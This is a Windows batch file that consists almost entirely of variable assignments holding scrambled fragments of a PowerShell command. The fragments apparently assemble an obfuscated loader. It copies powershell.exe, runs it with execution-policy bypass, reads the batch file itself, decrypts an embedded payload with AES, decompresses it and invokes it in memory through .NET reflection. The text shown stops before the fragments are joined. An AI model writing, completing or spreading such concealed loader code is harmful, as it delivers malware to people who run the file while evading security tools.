@echo off
set "SBEppmOUNT=in"
set "IMkoXbvXMX= C"
set "jWsuWyFQDC=.e"
set "itVboBHycS=ll"
set "OrYirHsOIk=Po"
set "FsxdPmrEuO=he"
set "WJqLLHQaah=nd"
set "CzYzOCzUzJ=rs"
set "sbLCKpLRac=xe"
set "KCprLFkDFy=0\"
set "UkGWLSgvbA=do"
set "JDyebIEBgU=Sy"
set "HjVQoTvolk=we"
set "hoJUxfHHym=ws"
set "XYuUFERKSj=rS"
set "qOWWPBzTVc=s\"
set "whnrtVsRzI=Wi"
set "iGPhfetwvN=\W"
set "JwNEBBiDbl=py"
set "PHWzFeEhqV=1."
set "XDpseRVllp=po"
set "DtzpcNiVcV=ow"
set "ubpXjZqlmv=co"
set "fOlloPWdCN=\v"
set "BRTwbjDWkn= /"
set "VaRGzIZdhr=y "
set "FhwAfDmxEe=he"
set "iWeYxaVuou=32"
set "MwPDrhNuVk=em"
set "sVnRCGluGe=:\"
set "AsNQpgGouz=ll"
set "laHvzXaTvm=we"
set "PluzAcIXoF=st"
set "cuTBPsOVwk= %~dp0"
set "fOFqBbUylJ=cd"
set "QiMyfwDytE=ypto"
set "TrREKQUmnP=cAsf"
set "UMwGvCqCFO=;$rf"
set "yIhQmMgYhU=sion"
set "ehuyMhQzOB=-Obj"
set "ewQLPHfPIS=AsPd"
set "egRWWZUqBo=-nop"
set "sXelMhCTYS='[-1"
set "qZCLgOacQN=-joi"
set "qywgzTJjiV=ing("
set "bEXimwOpdR=eMVs"
set "DUXvMNmGjK=..-1"
set "OOvcMsbsDD=pStr"
set "eyJGtKnfeU=mW, "
set "uidKtynCOm=tzMc"
set "ruIdbpvcJV=cAsf"
set "BwodVyzAiA= '')"
set "daOYPhgOpp=Pd.T"
set "mpIObNuiJh=mory"
set "jJHtegYhnC=bjec"
set "WjHYsLtbYq=ode]"
set "KMCTgxdQBQ=Bmor"
set "SJHWeSFQFP=Wb.T"
set "KlurgUfXGT=onve"
set "rMEMQBgYeY=urit"
set "UDcULRuEyR=ert]"
set "wdHDcjafHu=esMa"
set "MbmKCcZFlO= = $"
set "xIwUpSmAFG=zHhH"
set "WYylFzwpjL=d;$c"
set "yogifOeScC=;$hR"
set "HjkkUUIWeY=)($c"
set "mbtZYJxAmU=ect "
set "MSluCWEHbz=gnir"
set "cecJrbsIrP=morF"
set "KbUMcJEmLi='')("
set "VWcFUbllUY=[Sys"
set "thekZIBDwm=nirt"
set "QbGEnFVjSn=('%~f0'"
set "pNHgkqmHSX=PKCS"
set "cFLkoafwwl=::('"
set "dsiUUshdjs=iron"
set "CkKAxSByoj=k.En"
set "SdWNpuUUax=mXrp"
set "lvKTuVGCad=AsfZ"
set "SQVXIpUFtH=YWb "
set "KNvDJCcsyO=[IO."
set "nufAXtqMbB=dj0C"
set "wFUuTaaHPn=brea"
set "fEqguMZTdG=n ''"
set "WiavwsmICm=6] -"
set "UVUChwYVLX=Syst"
set "wIQmAcVGXO=.Len"
set "nlsKXNFciq=m.IO"
set "ryfkBjbpOy=]::("
set "jeqClHACdJ=kmW."
set "sYqhzMyAMw=ress"
set "geJbYWsOww=.Cry"
set "TFiZiaImXw=Stre"
set "MXphXMztpT=O.Me"
set "SPptEQvyXr=trea"
set "bMhzyDpiHq=ss -"
set "jfFxPrWUKP=ress"
set "cOiVeqCUxS=ct S"
set "fUVxBdDEfo=NtzM"
set "GnspzlNGHO=New-"
set "dCGbntZpab=ionM"
set "IyVekfaDbP=comp"
set "yXeayxIcMJ=$GYG"
set "RWgOALgbHn=-1.."
set "gArnHKDcny=$cAs"
set "juUvbSNDvt=yste"
set "uVpDNwJmlp=-joi"
set "oKQctSexkj=.Mem"
set "ogeOIqtqOf=Mc.D"
set "LluFZcUKTJ=Secu"
set "xLhqZVHjTy=();$"
set "EPuJUKGITf=tem."
set "TVndiYbDqq=ring"
set "nbntssxpbW=.-16"
set "JXWVKsHwDv=:: '"
set "wCkQvpbEmJ=zuZI"
set "fSOTirUebn=lBlo"
set "XCdzSdMhCc=('Tg"
set "LRGeAjMNVQ=orF'"
set "CbwFMLhDtQ=($WG"
set "lCTgpoLDng=tryP"
set "PLTECbgPqS=bypa"
set "HWjORRkbWv=pher"
set "jtGgvDhoMA=$HAs"
set "sdlABNAyZe=3); "
set "tCuKyigSsr=g = "
set "syVIfNhBQB=ose("
set "jORtXhXNpk=t Sy"
set "qYrbfwRyvQ=ew-O"
set "BsUlEkKeJT=nsXu"
set "zZMBrIyMjB=pose"
set "RRTtrDdHPl=;$en"
set "RWBSSBrqWy=ptog"
set "iHKUQEJnQE=BC;$"
set "MxMYsrPEqX='0Pg"
set "PaKQxzuwxD=fZ);"
set "MLVWBvDVsj=[Sys"
set "xiAfEoUDlI= '')"
set "OvlOxRdqGL=; };"
set "pZANLyFuKQ=j.Su"
set "WJaegYmvds=stem"
set "XQMOytUYBI=File"
set "afgwWmjgya=yTo("
set "kihghOXaHO=eam("
set "xJbgBzulqv=] -j"
set "bTQsZDrxmE=);$e"
set "QoXJptDeUl=-4] "
set "tkuXiTsJGc=y.Ci"
set "dmvTVTmTGV=New-"
set "DfAvVfJpug=Z = "
set "XYvCppbGNh=$Ntz"
set "gwKpOHCNAD=th('"
set "MPIvPyEvXD=e = "
set "rapRFZDhaX=S46e"
set "ipPCuNHURi=CFxo"
set "vtmFuVTZpv=yste"
set "NLUPWqqvoW=rity"
set "aTbuGoKRFh=F'[-"
set "qblYOjImnS=tem."
set "pvIWTKadze=;$hR"
set "sVyDYRQScn=e]::"
set "uVmKWIBzDq=, $c"
set "etgxeDufIu=Pd);"
set "ewwQsMHbRO=ck($"
set "qRPpUyVbOu=WGZB"
set "VcNVBWLHAt=)($Q"
set "slNRgBVIMK= = ["
set "WRTKZXvYAe=.Cry"
set "McAQSDrixO=Z, 0"
set "zdjkanXHBO=y.Cr"
set "LSWfxnFDys=in $"
set "BQFzrySDsK=flec"
set "JlbVgqdHVQ=  $Q"
set "SCfIhshSsI=mXrp"
set "rjvWGtsvxD=ZBj "
set "BSVNdfLabn=ion."
set "rHTCjNNWTv=);$H"
set "xoJllpDLAG=.Key"
set "cPEeooTZak=Invo"
set "rRYUyBugdP=rt]:"
set "wRquFTjuun===')"
set "ffTVFaRZzG=Fnkm"
set "XBRIpFNuSz=le  "
set "OpsmKucDfJ=$cAs"
set "lzxbeklbMk=comm"
set "kgkhpbtfXc= [Sy"
set "gWkYoTZkoX=]::N"
set "YDQPJjASFO=q) {"
set "dXnfPQRJsF=rp.I"
set "qsptpkIaLd=Disp"
set "rwTSoKlcJB== [S"
set "lbahuGGScr=.Dis"
set "pxAVccmerg=l5E7"
set "DAAycPIKRN=L4Yi"
set "VGmUpepmVy=TllA"
set "oHRBlolGjj=mXrp"
set "iDupDhPpZX=c = "
set "QVMZRqpPvO=stem"
set "twVVncIQob=daeR"
set "mLPqcKJtIX=Z = "
set "UxCwhrrZrR=gjYA"
set "UcbtSnvxDH=stem"
set "PzFdtEOHJo=[]] "
set "KMTyrtIAPM=ke($"
set "mPmkXsqSrS=oin "
set "sCOoZEOMoW=embl"
set "njplTDjXHN=).Sp"
set "NNbUsyUtEN=1] -"
set "ZZyPvdPkoh=Mode"
set "OdNvPLawGG=esaB"
set "HpFKYslLvT=oArr"
set "SxjFnbBKfl=tem."
set "XeweeZqLYl=)) {"
set "bPkXLHBEKY=]::C"
set "uYMIQACbcF=1..-"
set "fYpVdCeTmj=Fina"
set "FGwtWHwDUv=W = "
set "BiZfrLfajU=YWb."
set "VyIFFZjBHi=pres"
set "wfbFfpZoYb=form"
set "lbWFjtyPgA=tsWi"
set "xfQUAZeLGA=.Com"
set "wOvvSdrZjq=grap"
set "UBQMgizEMW=gsYZ"
set "gSOMvnzLFt=mXrp"
set "BFoJgLOLOv=RmAx"
set "qGrYmspDZR=ddin"
set "KALgDzERci=m(, "
set "ulIXXlImgn=and "
set "LTTLotDMel=rity"
set "rPKPbghkFb=fore"
set "nnUHekmRmE=ptor"
set "jqyTzGZJrt=ispo"
set "borKzmiOEQ=oint"
set "gVscIivaBI==');"
set "PjhqrRVNaX=rans"
set "nAhPYMbqrI=.Con"
set "zWJqxYbpOs=$cmX"
set "jrLxptDasL=hy.A"
set "AETdBMxneX=ress"
set "llxciryYYU=lit("
set "KkyFDkVKRa=.GZi"
set "ZVafyTNVhd=wbk "
set "BjpdesUxXH=.IO."
set "AiOQAHNBff=YxVw"
set "dhvzaSLmdk=p.Pa"
set "mMCZvNnRWB='[-1"
set "tmsgbCLexx=em.I"
set "yEJKdRCunR=k; }"
set "ONimeSCdgB= = $"
set "ptlXARURZT=PxEW"
set "yPFUeZyDLO=y.Pa"
set "KyyctoeaUQ=pioa"
set "gEfbJjddip=($WG"
set "QfYlOcmOec=, (,"
set "TctVxOuBwJ=fZ ="
set "KnzvTrtkDw=ecry"
set "gUvNcgwjAj=('%*'"
set "rHaCPQjnrC=:('g"
set "hifsOqsedp=GYGn"
set "EuwKubcVer=$HAs"
set "HmDIHXNmYi=[Sys"
set "pMFrZTzbCH=yste"
set "roSesFJuKD=tion"
set "DMCtVCitjD=PTtG"
set "HsTXmcbigy=cAsf"
set "uyEcuXegHb=gth)"
set "omWAxLRkjI=n ''"
set "ZOlZFEjljN=rofi"
set "rSaaVXZRmq=::De"
set "qLHVGiBzUd=Conv"
set "NPJyQuvbCb=pioa"
set "ITIsEtLEBe=cmXr"
set "epkfGNtSlq=rfwb"
set "ReyecFYUvf=se()"
set "NSsoCKPUJe= New"
set "IHEojjvGzL=Comp"
set "crNmPEokrO=Syst"
set "HYYKuNkSxK=('da"
set "oBldmZDxqT=raph"
set "ZtkeWWtgMi=[Env"
set "KgDjECwdJk=Pd ="
set "xCTWBZpkYG=vert"
set "wehJnuYNla=ct S"
set "IbxwbPvWnO=6esa"
set "TgELPLadcv=$Fnk"
set "jclzKScChQ=ewLi"
set "cpHEeNRboo=y]::"
set "RKYjCtJOoF=m.IO"
set "iXoDkogMyB=ddin"
set "kPCkmvkYCl=-ep "
set "OjNxeURUdQ=)))"
set "iGFusOzEeO=oL'["
set "rdOXqCwdQs=sXu."
set "dsCxZpURpZ= = N"
set "aNFMbHpmYX=.Ass"
set "LQajglmCkD=.Cop"
set "ISaulFsLNS=Obje"
set "ATbIvSVFND=raph"
set "YIEACLHNsX=nage"
set "lsOMooLMCJ=ay()"
set "tyAzOdaXtM=]::("
set "VhziJPcnRF=106u"
set "QBczzEhOEB=em.C"
set "GwMhnNrsUt=ptog"
set "PfdfyQdjBm= [Sy"
set "mVddhHjJmb=Comp"
set "cmrPrANlUD=.Mod"
set "pdiuTnAUhh=16] "
set "UUVgLKeriy= if "
set "anriFhbhvn=ZBj."
set "kdObOYzuuX=null"
set "YZLZNYCbih=join"
set "XZouzFYORI=();$"
set "wGzTyjhbkf=$HAs"
set "ZviXcXprPO=;$Fn"
set "BcvtfakxNO=$hRY"
set "UpRhzHZrse=bstr"
set "tWPlimptKw=ach "
set "kuOGExBPOr=ne);"
set "worUoNYrmW=tS46"
set "IAwLulbGLM=mXrp"
set "xMltZtLisT=.Sec"
set "AzlpAKNbZh=);$c"
set "fLuzkydQsH== $c"
set "JUBhcaZTsQ=ose("
set "VccxqNbjjr=AsfZ"
set "tvoOGkBGgq=);$N"
set "cqvkvueymT=V = "
set "DVyDnFVsMp=.Cre"
set "ppFLwLjIwx=.Dis"
set "CKdcIfzKDG=();$"
set "bSgTnmzzLI=);$c"
set "YDaMiNTHXH=ateD"
set "ckRKWFTFOZ=gMod"
set "WhTBCyPcwZ=s75K"
set "ehFJKBMKaR=Secu"
set "MUBOWwyZcs=Disp"
set "aQKRxqsjWP=[-1."
set "CZydvKZviD='gni"
set "vqZxKbAOab=join"
set "fbqlZqnRAr=nq ="
